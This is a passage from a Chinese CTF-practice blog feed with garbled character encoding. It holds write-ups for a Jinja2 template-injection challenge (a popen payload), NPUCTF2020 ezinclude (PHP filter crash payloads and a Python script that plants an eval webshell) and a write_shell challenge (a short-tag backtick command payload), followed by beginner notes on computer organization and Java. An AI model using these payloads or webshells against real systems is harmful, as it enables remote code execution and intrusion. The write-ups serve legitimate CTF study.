alt="image-20220211112131255"></p><p>å¥½å®¶ä¼™å‡ºæ¥äº†å¾ˆå¤šå•Šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å°±å¥½ï¼Œæˆ‘ä»¬ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>æˆ‘ä»¬å…ˆæ¥æ‰¾ä¸‹os._wrap_close</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112532522.png" alt="image-20220211112532522"></p><p>å·²ç»å‡ºæ¥äº†åœ¨132ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªpayload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112709595.png" alt="image-20220211112709595"></p><p>æˆåŠŸåˆ—å‡ºæ¥äº†æ–‡ä»¶ã€‚</p><p>ç›´æ¥è¯»å–flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112747491.png" alt="image-20220211112747491"></p><p>åŒç†ï¼Œå¯ä»¥åˆ©ç”¨çš„ç±»è¿˜æœ‰å¾ˆå¤šå•Šï¼Œ</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112931751.png" alt="image-20220211112931751"></p><p>å°±åƒè¿™ä¸ªç±»ä¹Ÿåœ¨é‡Œé¢åŒ…å«ç€ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨å®ƒæ¥è·å–flagã€‚</p><p>æ–¹æ³•æœ‰å¾ˆå¤šï¼Œç†è§£åŸç†å¹¶æŒæ¡å…¶ä¸­å‡ ç§æ–¹æ³•å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
      <link href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
      <url>/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘çœ‹äº†ä¸‹ä¸€äº›å¤§ä½¬çš„åšå®¢ï¼Œè¢«æ‰“å‡»åˆ°äº†ï¼Œè¦å­¦ä¹ çš„æœ‰å¤ªå¤šäº†ï¼ŒåŠ æ²¹å§ï¼</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>è¿›å»ç›´æ¥æ¥ä¸ªé”™è¯¯ï¼Ÿï¼Ÿï¼ŸWTF?</p><p>çœ‹ä¸‹æºç </p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>ç–‘ä¼¼å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼ŒæŠ“ä¸‹åŒ…çœ‹çœ‹</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>èŠœæ¹–ï¼Œhashç›´æ¥ç»™æˆ‘äº†ï¼Ÿ</p><p>ç›´æ¥ä¼ å¥½åƒä¸å¤ªè¡Œ?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>ç¥­å‡ºç¥å™¨burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>å¾—åˆ°æ–‡ä»¶å flflflflag.php</p><p>è®¿é—®ä¸€ä¸‹æ–‡ä»¶:</p><p>å¾—åˆ°å¦‚ä¸‹response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>æˆ‘å·²ç»æœ‰äº†å¥³æœ‹å‹æ‰€ä»¥æˆ‘æ¯”å‡ºé¢˜äººå¼º(æ‰‹åŠ¨ç‹—å¤´)</p><p>include å‡½æ•°å¥½å®¶ä¼™ï¼Œæ–‡ä»¶åŒ…å«åº”è¯¥æœ‰äº†</p><p>æ¥è¯»å–ä¸‹æºç </p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>è§£ç å¦‚ä¸‹:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ²¡æ³•å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>é‚£å°±æ‰«ä¸€ä¸‹ç›®å½•æŠŠ:</p><p>æœ€ç»ˆæ‰«å‡ºæ¥äº†ä¸€ä¸ª</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>è¿™ä¸ªç›®å½•åº”è¯¥æ˜¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶çš„åå­—ï¼Œæ¥ç»“åˆæ–‡ä»¶åŒ…å«ä½¿ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬å°±è¦å°è¯•å»ä¼ shell</p><p>å¯ä»¥ç”¨php7 segment faultç‰¹æ€§</p><blockquote><p>å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™</p></blockquote><p>å‚è€ƒé“¾æ¥ï¼›<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshellã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çŸ¥é“æ–‡ä»¶åå°±ä¸éœ€è¦çˆ†ç ´äº†</p><p>è¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒï¼š</p><pre><code>â€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤â€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤â€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 è€ç‰ˆæœ¬é€šæ€php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>ç”±äºtmpç›®å½•ä¸€èˆ¬æ˜¯ä¸å¯è®¿é—®çš„ï¼Œæ‰€ä»¥è¯¥æ¼æ´å¸¸å¸¸å’Œæ–‡ä»¶åŒ…å«ç»“åˆèµ·æ¥ä½¿ç”¨</p><p>expå¦‚ä¸‹:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>è¿è¡Œ</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>è¿™é‡Œå¤šäº†ä¸€ä¸ªæ–‡ä»¶</p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>æµ‹è¯•æˆåŠŸäº†ï¼Œä½†æ˜¯æ— æ³•æ·»åŠ ï¼Œï¼Œè«åçš„é”™è¯¯</p><p>åŒç†é‚£å°±å†æ·»åŠ ä¸ªphpinfoå§</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>æˆåŠŸæ‰¾åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç \å‘½ä»¤æ‰§è¡Œç±» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·CTF 2021 write_shell_0x81-0x8F</title>
      <link href="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
      <url>/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</url>
      
        <content type="html"><![CDATA[<p>è¿™é“é¢˜å±äºæ¯”è¾ƒç®€å•çš„ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æºç </p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>å½“æˆ‘ä»¬åœ¨åç¼€åŠ ä¸Š?action=pwd å°±å¯ä»¥å¾—åˆ°è·¯å¾„</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>å†æ¢æˆuploadå°±å¯ä»¥å†™æ–‡ä»¶</p><p>?action=upload&amp;date=xxx</p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯shellçš„å†™å…¥ï¼Œä½†æ˜¯å®ƒè¿‡æ»¤äº†ä¸å°‘å…³é”®è¯</p><p>å…¶ä¸­è¿‡æ»¤äº†phpè¿™ä¸ªå…³é”®è¯ï¼Œä½†æ˜¯è¿™ä¸ªå¯ä»¥è¿›è¡Œç»•è¿‡</p><pre><code>PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?=?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?=?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;å¤§éƒ¨åˆ†æ–‡ç« è¯´çŸ­æ ‡ç­¾éœ€è¦åœ¨php.iniä¸­è®¾ç½®short_open_tagä¸ºonæ‰èƒ½å¼€å¯çŸ­æ ‡ç­¾(é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œä½†ä¼¼ä¹åˆé»˜è®¤æ³¨é‡Šï¼Œæ‰€ä»¥è¿˜æ˜¯ç­‰äºæ²¡å¼€å¯)ã€‚ä½†å®é™…ä¸Šåœ¨PHP5.4ä»¥åï¼Œæ— è®ºshort_open_tagæ˜¯å¦å¼€å¯ï¼Œ&lt;?=?&gt;è¿™ç§å†™æ³•æ€»æ˜¯é€‚ç”¨çš„ï¼Œ&lt;??&gt;è¿™ç§å†™æ³•åˆ™éœ€è¦short_open_tagå¼€å¯æ‰è¡Œã€‚</code></pre><p>PHPä¸­ï¼Œåå¼•å·å¯ä»¥èµ·åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><p>ç©ºæ ¼å¯ä»¥ç”¨urlç¼–ç ç»•è¿‡%09</p><p>ç”±è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºpayload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>è®¿é—®æ–‡ä»¶</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>ç›´æ¥è·å–æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œè®¿é—®æ–‡ä»¶ï¼Œè·å¾—flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç»„æˆåŸç†</title>
      <link href="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>å‰è¨€ï¼šç”±äºæœ¬äººéè®¡ç®—æœºä¸“ä¸š(è‹¦é€¼åŒ–å·¥ç‹—)ï¼Œæ‰€ä»¥æƒ³è¦è‡ªå·±è¡¥ä¸€ä¸‹è®¡ç®—æœºçš„åŸºç¡€ï¼Œè¿™æ ·æ‰èƒ½å‘å±•çš„æ›´è¿œï¼Œæ‰€ä»¥å¼€äº†è¿™ä¸€æ ï¼Œä»¥åä¼šåšæŒæ›´æ–°~</p><h1 id="è®¡ç®—æœºç»„æˆåŸç†æ¦‚è¿°ç¯‡"><a href="#è®¡ç®—æœºç»„æˆåŸç†æ¦‚è¿°ç¯‡" class="headerlink" title="è®¡ç®—æœºç»„æˆåŸç†æ¦‚è¿°ç¯‡"></a>è®¡ç®—æœºç»„æˆåŸç†æ¦‚è¿°ç¯‡</h1><h2 id="è®¡ç®—æœºçš„å‘å±•å†å²"><a href="#è®¡ç®—æœºçš„å‘å±•å†å²" class="headerlink" title="è®¡ç®—æœºçš„å‘å±•å†å²"></a>è®¡ç®—æœºçš„å‘å±•å†å²</h2><h3 id="è®¡ç®—æœºå‘å±•çš„å››ä¸ªé˜¶æ®µ"><a href="#è®¡ç®—æœºå‘å±•çš„å››ä¸ªé˜¶æ®µ" class="headerlink" title="è®¡ç®—æœºå‘å±•çš„å››ä¸ªé˜¶æ®µ"></a>è®¡ç®—æœºå‘å±•çš„å››ä¸ªé˜¶æ®µ</h3><p>ç¬¬ä¸€ä¸ªé˜¶æ®µ:ç”µå­ç®¡è®¡ç®—æœº</p><p>é›†æˆåº¦å°ï¼Œç©ºé—´å ç”¨å¤§</p><p>åŠŸè€—é«˜ï¼Œè¿è¡Œé€Ÿåº¦æ…¢</p><p>æ“ä½œå¤æ‚ï¼Œæ›´æ¢ç¨‹åºéœ€è¦æ¥çº¿</p><p>ç¬¬äºŒä¸ªé˜¶æ®µ:æ™¶ä½“ç®¡è®¡ç®—æœº</p><p>é›†æˆåº¦ç›¸å¯¹è¾ƒé«˜ï¼Œç©ºé—´å ç”¨ç›¸å¯¹å°</p><p>åŠŸè€—ç›¸å¯¹è¾ƒä½ï¼Œè¿è¡Œé€Ÿåº¦å¿«</p><p>æ“ä½œç›¸å¯¹ç®€å•ï¼Œäº¤äº’æ›´åŠ æ–¹ä¾¿</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211222959451.png" alt="image-20220211222959451"></p><p>ç¬¬ä¸‰ä¸ªé˜¶æ®µ:é›†æˆç”µè·¯è®¡ç®—æœº</p><p>è®¡ç®—æœºå˜å¾—æ›´å°</p><p>åŠŸè€—å˜å¾—æ›´ä½</p><p>è®¡ç®—é€Ÿåº¦å˜å¾—æ›´å¿«</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211223618107.png" alt="image-20220211223618107"></p><p>ç¬¬å››ä¸ªé˜¶æ®µ:è¶…å¤§è§„æ¨¡é›†æˆç”µè·¯è®¡ç®—æœº</p><p>ä¸€ä¸ªèŠ¯ç‰‡é›†æˆäº†ä¸Šç™¾ä¸‡çš„æ™¶ä½“ç®¡<br>é€Ÿåº¦æ›´å¿«ï¼Œä½“ç§¯æ›´å°ï¼Œä»·æ ¼æ›´ä½ï¼Œæ›´èƒ½è¢«å¤§ä¼—æ¥å—</p><p>ç”¨é€”ä¸°å¯Œ:æ–‡æœ¬å¤„ç†ï¼Œè¡¨æ ¼å¤„ç†ï¼Œé«˜äº¤äº’çš„æ¸¸æˆä¸åº”ç”¨</p><p>ç¬¬äº”ä¸ªé˜¶æ®µ:æœªæ¥è®¡ç®—æœº</p><p>ç”Ÿç‰©è®¡ç®—æœºï¼Œä»¥è›‹ç™½è´¨åˆ†å­ä½œä¸ºä¸»è¦åŸææ–™:</p><p>ä½“ç§¯å°ï¼Œæ•ˆç‡é«˜</p><p>ä¸æ˜“æŸå</p><p>ä¸å—ä¿¡å·å¹²æ‰°ï¼Œæ— çƒ­æŸè€— 1</p><p>é‡å­è®¡ç®—æœº</p><h3 id="å¾®å‹è®¡ç®—æœºçš„å‘å±•å†å²"><a href="#å¾®å‹è®¡ç®—æœºçš„å‘å±•å†å²" class="headerlink" title="å¾®å‹è®¡ç®—æœºçš„å‘å±•å†å²"></a>å¾®å‹è®¡ç®—æœºçš„å‘å±•å†å²</h3><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224519853.png" alt="image-20220211224519853"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224544536.png" alt="image-20220211224544536"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224641392.png" alt="image-20220211224641392"></p><h2 id="è®¡ç®—æœºçš„åˆ†ç±»"><a href="#è®¡ç®—æœºçš„åˆ†ç±»" class="headerlink" title="è®¡ç®—æœºçš„åˆ†ç±»"></a>è®¡ç®—æœºçš„åˆ†ç±»</h2><p>è¶…çº§è®¡ç®—æœº:</p><p>åŠŸèƒ½æœ€å¼ºã€è¿ç®—é€Ÿåº¦æœ€å¿«ã€å­˜å‚¨å®¹é‡æœ€å¤§çš„è®¡ç®—æœº</p><p>å¤šç”¨äºå›½å®¶é«˜ç§‘æŠ€é¢†åŸŸå’Œå°–ç«¯æŠ€æœ¯ç ”ç©¶</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225354851.png" alt="image-20220211225354851"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225444783.png" alt="image-20220211225444783"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225558827.png" alt="image-20220211225558827"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225812247.png" alt="image-20220211225812247"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225834345.png" alt="image-20220211225834345"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225944642.png" alt="image-20220211225944642"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230055284.png" alt="image-20220211230055284"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230109064.png" alt="image-20220211230109064"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230145911.png" alt="image-20220211230145911"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230155449.png" alt="image-20220211230155449"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230249731.png" alt="image-20220211230249731"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230318814.png" alt="image-20220211230318814"></p><h2 id="è®¡ç®—æœºçš„ä½“ç³»ä¸ç»“æ„"><a href="#è®¡ç®—æœºçš„ä½“ç³»ä¸ç»“æ„" class="headerlink" title="è®¡ç®—æœºçš„ä½“ç³»ä¸ç»“æ„"></a>è®¡ç®—æœºçš„ä½“ç³»ä¸ç»“æ„</h2><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212231520062.png" alt="image-20220212231520062"></p><p><strong>å¿…é¡»æœ‰ä¸€ä¸ªå­˜å‚¨å™¨</strong></p><p><strong>å¿…é¡»æœ‰ä¸€ä¸ªæ§åˆ¶å™¨</strong></p><p><strong>å¿…é¡»æœ‰ä¸€ä¸ªè¿ç®—å™¨</strong></p><p><strong>å¿…é¡»æœ‰è¾“å…¥è®¾å¤‡</strong></p><p><strong>å¿…é¡»æœ‰è¾“å‡ºè®¾å¤‡</strong></p><p>ç°ä»£è®¡ç®—æœºéƒ½æ˜¯å†¯è¯ºä¾æ›¼æœº</p><p>åŠŸèƒ½:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232001255.png" alt="image-20220212232001255"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232045504.png" alt="image-20220212232045504"></p><p>ç“¶é¢ˆ:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232350723.png" alt="image-20220212232350723"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232427464.png" alt="image-20220212232427464"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232520952.png" alt="image-20220212232520952"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232603902.png" alt="image-20220212232603902"></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
          <category> è®¡ç®—æœºç»„æˆåŸç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç»„æˆåŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå­¦ä¹ ä¹‹æ—…</title>
      <link href="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
      <url>/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>æœ¬ç¯‡æ–‡ç« æ›´æ–°javaç³»åˆ—çŸ¥è¯†â€”æŒç»­æ›´æ–°ä¸­</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png" alt="image-20220211163044997"></p><h1 id="å¿«æ·é”®é€ŸæŸ¥"><a href="#å¿«æ·é”®é€ŸæŸ¥" class="headerlink" title="å¿«æ·é”®é€ŸæŸ¥"></a>å¿«æ·é”®é€ŸæŸ¥</h1><pre><code>ctrl + shift + u å¤§å°å†™æ›¿æ¢ctrl + alt +t å¿«é€Ÿå†™ä¸€äº›æ–¹æ³•ï¼Œå¦‚try catchalt + insert sout  è¾“å‡ºpsvm ä¸»å‡½æ•°</code></pre><h1 id="day1-javaåˆè¯†"><a href="#day1-javaåˆè¯†" class="headerlink" title="day1  javaåˆè¯†"></a>day1  javaåˆè¯†</h1><h2 id="ç¬¬ä¸€ä¸ªHelloWordç¨‹åº"><a href="#ç¬¬ä¸€ä¸ªHelloWordç¨‹åº" class="headerlink" title="ç¬¬ä¸€ä¸ªHelloWordç¨‹åº"></a>ç¬¬ä¸€ä¸ªHelloWordç¨‹åº</h2><pre><code class="java">/*è¿™é‡ŒHelloWordæ˜¯ç±»åvoid main æ˜¯æ–¹æ³•ï¼Œä¹Ÿæ˜¯ç¨‹åºçš„å…¥å£void ç©ºmain ä¸»å‡½æ•°*/class HelloWord&#123;    public static void main(String[] args)&#123;                System.out.println(&quot;Hello Word!&quot;);    &#125;&#125;</code></pre><p>é¦–å…ˆç”¨ javac helloword.java â€“&gt;ç¼–è¯‘ä¸º   helloword.class</p><p>ç„¶å java helloword æ‰§è¡Œ(è¿™é‡Œæ³¨æ„ä¸è¦åŠ åç¼€!)</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211171119785.png" alt="image-20220211171119785"></p><p>æ³¨æ„ç‚¹:</p><p>1ã€javaä¸­ä¸¥æ ¼åŒºåˆ†å¤§å°å†™</p><p>2ã€è¦è®°å¾—æ›´æ”¹ç¼–è¾‘å™¨çš„ç¼–ç æ–¹å¼ è¦ä¿æŒç¼–ç ä¸€è‡´æ‰èƒ½è¿è¡Œ</p><p>3ã€æ¯ä¸€è¡Œè¯­å¥ç»“æŸå¿…é¡»ä»¥;ç»“æŸ</p><p>4ã€æ³¨æ„ç¼©è¿›</p><p>5ã€ç±»åæ˜¯ä»€ä¹ˆï¼Œç”Ÿæˆçš„å­—èŠ‚ç 